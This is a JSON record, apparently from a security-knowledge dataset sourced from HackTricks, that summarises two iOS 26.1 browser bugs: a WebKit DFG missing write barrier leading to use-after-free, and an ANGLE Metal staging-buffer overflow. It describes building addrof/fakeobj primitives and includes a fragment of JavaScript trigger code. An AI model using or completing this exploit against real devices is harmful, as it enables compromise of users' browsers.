{
  "id": "binary_exploitation_1eb60e33db08",
  "category": "binary-exploitation",
  "title": "webkit dfg store barrier uaf angle oob",
  "description": "# WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1)\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Summary\n- **DFG Store Barrier bug (CVE-2025-43529)**: In `DFGStoreBarrierInsertionPhase.cpp`, a **Phi node marked escaped while its Upsilon inputs are not** causes the phase to **skip inserting a write barrier** on subsequent object stores. Under GC pressure this lets JSC free still-reachable objects \u2192 **use-after-free**.\n- **Exploit target**: Force a **Date** object to materialize a ",
  "payloads": [
    "# WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1)",
    "{{#include ../../banners/hacktricks-training.md}}",
    "## Summary",
    "- **DFG Store Barrier bug (CVE-2025-43529)**: In `DFGStoreBarrierInsertionPhase.cpp`, a **Phi node marked escaped while its Upsilon inputs are not** causes the phase to **skip inserting a write barrier** on subsequent object stores. Under GC pressure this lets JSC free still-reachable objects \u2192 **use-after-free**.",
    "- **Exploit target**: Force a **Date** object to materialize a butterfly (e.g., `a[0] = 1.1`) so the butterfly is freed, then **reclaimed** as array element storage to build boxed/unboxed confusion \u2192 `addrof`/`fakeobj` primitives.",
    "- **ANGLE Metal PBO bug (CVE-2025-14174)**: The Metal backend allocates the PBO staging buffer using `UNPACK_IMAGE_HEIGHT` instead of the real texture height. Supplying a tiny unpack height then issuing a large `texImage2D` causes a **staging-buffer OOB write** (~240KB in the PoC below).",
    "- **PAC blockers on arm64e (iOS 26.1)**: TypedArray `m_vector` and JSArray `butterfly` are PAC-signed; forging fake objects with attacker-chosen pointers crashes with `EXC_BAD_ACCESS`/`EXC_ARM_PAC`. Only reusing **already-signed** butterflies (boxed/unboxed reinterpretation) works.",
    "## Triggering the DFG missing barrier \u2192 UAF",
    "function triggerUAF(flag, allocCount) {",
    "const A = {p0: 0x41414141, p1: 1.1, p2: 2.2};",
    "arr[arr_index] = A;                 // Tenure A in old space",
    "const a = new Date(1111); a[0] = 1.1; // Force Date butterfly",
    "// GC pressure",
    "for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));",
    "const b = {p0: 0x42424242, p1: 1.1};"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/binary-exploitation/ios-exploiting/webkit-dfg-store-barrier-uaf-angle-oob.md"
  ]
}